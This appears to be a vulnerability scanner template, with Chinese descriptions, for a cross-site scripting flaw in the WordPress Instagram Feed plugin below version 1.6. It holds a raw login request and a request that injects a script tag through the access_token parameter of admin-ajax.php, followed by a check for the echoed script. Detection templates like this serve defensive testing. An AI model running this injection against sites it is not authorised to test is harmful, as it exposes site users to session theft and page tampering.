id: wp-instagram-feed-xss

info:
  name: Instagram Feed < 1.6 - 跨站脚本漏洞
  author: theamanrawat
  severity: medium
  description: Instagram Feed < 1.6 - 跨站脚本 存在跨站脚本漏洞。该模板通过构造恶意输入并检查响应回显或执行特征，验证目标是否会在浏览器上下文中执行注入脚本。
  impact: |
    - 攻击者可在受害者浏览器上下文中执行恶意脚本。
    - 可能导致 Cookie 窃取、会话劫持、页面篡改或钓鱼攻击。
  remediation: |
    - 按厂商公告升级到已修复版本；原始说明中提到的版本信息为：version 1.6 or later.。
    - 对所有可控输入实施严格校验，并在输出到 HTML、JavaScript 或 URL 上下文前完成正确编码。
    - 如为后台或插件组件问题，建议同步更新到厂商已修复版本并审计相关功能入口。
  reference:
    - https://dumpco.re/blog/xss-instagram-feed
    - https://wordpress.org/plugins/instagram-feed
  metadata:
    verified: false
    max-requests: 2
    public-www: "/wp-content/plugins/instagram-feed/"
  tags: wordpress,wp,instagram-feed,xss,authenticated

flow: http(1) && http(2)

http:
  - raw:
      - |
        POST /wp-login.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        log={{username}}&pwd={{password}}&wp-submit=Log+In

    matchers:
      - type: dsl
        dsl:
          - status_code == 302
          - contains(header, "wordpress_logged_in")
        condition: and
        internal: true

  - raw:
      - |
        POST /wp-admin/admin-ajax.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8

        action=sbi_auto_save_tokens&access_token=<script>alert(document.domain)</script>

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(content_type, "text/html")'
          - 'contains_all(body, "<script>alert(document.domain)</script>")'
        condition: and
